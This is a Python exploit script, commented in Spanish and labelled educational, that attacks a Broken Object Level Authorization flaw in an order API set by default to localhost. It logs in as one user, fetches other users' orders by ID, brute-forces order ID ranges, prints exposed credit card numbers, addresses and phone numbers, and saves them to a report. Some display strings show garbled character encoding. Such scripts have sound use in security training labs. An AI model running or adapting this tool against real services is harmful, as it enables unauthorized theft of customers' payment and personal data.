#!/usr/bin/env python3
"""Exploit educativo para demostrar BOLA en el proyecto BOLA-VULNERABILITY."""

import argparse
import os
import time
from datetime import datetime

import requests
from colorama import Fore, Style, init

init(autoreset=True)


class BOLAExploit:
    def __init__(self, base_url: str, verify: bool = True, proxies=None, timeout: int = 10):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = verify
        self.session.proxies = proxies or {}
        self.session.timeout = timeout
        self.tokens = {}

    def _url(self, path: str) -> str:
        path = path[1:] if path.startswith('/') else path
        return f"{self.base_url}/{path}"

    @staticmethod
    def print_banner():
        banner = f"""
{Fore.RED}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë         BOLA EXPLOIT - DEMOSTRACI√ìN EDUCACIONAL          ‚ïë
‚ïë       Broken Object Level Authorization Attack           ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù{Style.RESET_ALL}
{Fore.YELLOW}‚ö†Ô∏è  Solo para uso en entornos controlados y con permiso ‚ö†Ô∏è{Style.RESET_ALL}
"""
        print(banner)

    def login(self, email: str, password: str):
        print(f"{Fore.CYAN}[*] Autenticando como {email}...")
        try:
            response = self.session.post(
                self._url('/api/auth/login'),
                json={"email": email, "password": password},
                timeout=self.session.timeout,
            )
            response.raise_for_status()
        except requests.RequestException as exc:
            print(f"{Fore.RED}[‚úó] Error de red en login: {exc}")
            return None, None

        data = response.json()
        token = data.get('token')
        user = data.get('user')
        if not token or not user:
            print(f"{Fore.RED}[‚úó] Respuesta de login inv√°lida: {data}")
            return None, None

        self.tokens[email] = token
        print(f"{Fore.GREEN}[‚úì] Login exitoso: {user['name']} (ID: {user['id']})")
        return token, user

    def _auth_headers(self, token: str) -> dict:
        return {"Authorization": f"Bearer {token}"}

    def get_my_orders(self, token: str):
        print(f"\n{Fore.CYAN}[*] Obteniendo √≥rdenes propias...")
        try:
            response = self.session.get(
                self._url('/api/orders'),
                headers=self._auth_headers(token),
                timeout=self.session.timeout,
            )
            response.raise_for_status()
        except requests.RequestException as exc:
            print(f"{Fore.RED}[‚úó] Error obteniendo √≥rdenes: {exc}")
            return []

        data = response.json()
        orders = data.get('orders', [])
        print(f"{Fore.GREEN}[‚úì] Se encontraron {len(orders)} √≥rdenes propias")
        for order in orders:
            print(f"    ‚îî‚îÄ Orden #{order['id']}: {order['product']} - ${order['amount']}")
        return orders

    def exploit_bola(self, token: str, target_order_id: int):
        print(f"\n{Fore.RED}[!] EXPLOTANDO BOLA - Intentando acceder a orden #{target_order_id}")
        try:
            response = self.session.get(
                self._url(f"/api/orders/{target_order_id}"),
                headers=self._auth_headers(token),
                timeout=self.session.timeout,
            )
        except requests.RequestException as exc:
            print(f"{Fore.RED}[‚úó] Error de red: {exc}")
            return False, None

        if response.status_code == 200:
            order = response.json().get('order')
            if order:
                print(f"{Fore.RED}[üíÄ] VULNERABILIDAD CONFIRMADA!")
                print(f"{Fore.YELLOW}[!] Datos expuestos:")
                for key in ("id", "userId", "product", "amount", "creditCard", "address", "phone"):
                    print(f"    ‚îî‚îÄ {key}: {order.get(key, 'N/A')}")
                return True, order
        elif response.status_code == 404:
            print(f"{Fore.YELLOW}[~] Orden no encontrada o inexistente")
        else:
            print(f"{Fore.GREEN}[üõ°Ô∏è] Acceso bloqueado (HTTP {response.status_code})")
        return False, None

    def brute_force_orders(self, token: str, start_id: int, max_id: int, delay: float):
        print(f"\n{Fore.MAGENTA}[*] Fuerza bruta de IDs ({start_id}-{max_id})...")
        found = []
        for order_id in range(start_id, max_id + 1):
            success, order = self.exploit_bola(token, order_id)
            if success and order:
                found.append(order)
            time.sleep(delay)
        print(f"{Fore.GREEN}[‚úì] Fuerza bruta completada. √ìrdenes halladas: {len(found)}")
        return found

    @staticmethod
    def generate_report(orders, report_file: str):
        report = [
            "Reporte de explotaci√≥n BOLA",
            f"Fecha: {datetime.now():%Y-%m-%d %H:%M:%S}",
            f"√ìrdenes comprometidas: {len(orders)}",
            "",
        ]
        for order in orders:
            report.extend([
                f"Orden #{order.get('id')}",
                f"  Usuario afectado: {order.get('userId')}",
                f"  Producto: {order.get('product')}",
                f"  Monto: {order.get('amount')}",
                f"  Tarjeta: {order.get('creditCard')}",
                f"  Direcci√≥n: {order.get('address')}",
                f"  Tel√©fono: {order.get('phone')}",
                "",
            ])
        with open(report_file, 'w', encoding='utf-8') as handler:
            handler.write("\n".join(report))
        print(f"{Fore.GREEN}[‚úì] Reporte guardado en {report_file}")


def parse_args():
    env = os.environ
    parser = argparse.ArgumentParser(
        description="Exploit educativo BOLA (Broken Object Level Authorization)",
    )
    parser.add_argument('--base-url', default=env.get('BOLA_BASE_URL', 'http://localhost:3000'), help='URL base de la API vulnerable')
    parser.add_argument('--email', default=env.get('BOLA_EMAIL', 'alice@example.com'), help='Email para autenticarse')
    parser.add_argument('--password', default=env.get('BOLA_PASSWORD', 'password123'), help='Password para autenticarse')
    parser.add_argument('--targets', default=env.get('BOLA_TARGET_ORDERS', '3,4,5'), help='IDs de √≥rdenes a atacar (coma separada)')
    parser.add_argument('--brute-start', type=int, default=int(env.get('BOLA_BRUTE_START', 1)), help='ID inicial para fuerza bruta')
    parser.add_argument('--brute-max', type=int, default=int(env.get('BOLA_BRUTE_MAX', 10)), help='ID m√°ximo para fuerza bruta')
    parser.add_argument('--brute-delay', type=float, default=float(env.get('BOLA_BRUTE_DELAY', 0.2)), help='Delay entre requests de fuerza bruta')
    parser.add_argument('--report-file', default=env.get('BOLA_REPORT_FILE', 'exploit_report.txt'), help='Archivo de salida para reporte')
    parser.add_argument('--skip-bruteforce', action='store_true', help='Omitir fuerza bruta de IDs')
    parser.add_argument('--insecure', action='store_true', help='Deshabilitar verificaci√≥n TLS (para labs)')
    parser.add_argument('--proxy', default=env.get('BOLA_PROXY'), help='Proxy HTTP/HTTPS (p.ej. http://127.0.0.1:8080)')
    return parser.parse_args()


def main():
    args = parse_args()
    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
    exploit = BOLAExploit(args.base_url, verify=not args.insecure, proxies=proxies)
    exploit.print_banner()

    token, user = exploit.login(args.email, args.password)
    if not token:
        return

    exploit.get_my_orders(token)

    targets = [int(t.strip()) for t in args.targets.split(',') if t.strip().isdigit()]
    exploited = []
    for order_id in targets:
        success, order = exploit.exploit_bola(token, order_id)
        if success and order:
            exploited.append(order)
        time.sleep(args.brute_delay)

    brute_orders = []
    if not args.skip_bruteforce:
        brute_orders = exploit.brute_force_orders(token, args.brute_start, args.brute_max, args.brute_delay)

    compromised = exploited or brute_orders
    if compromised:
        exploit.generate_report(compromised, args.report_file)
    else:
        print(f"{Fore.YELLOW}[~] No se obtuvieron √≥rdenes ajenas. La API podr√≠a estar protegida.")

    print(f"\n{Fore.GREEN}[‚úì] Demostraci√≥n finalizada")


if __name__ == '__main__':
    main()
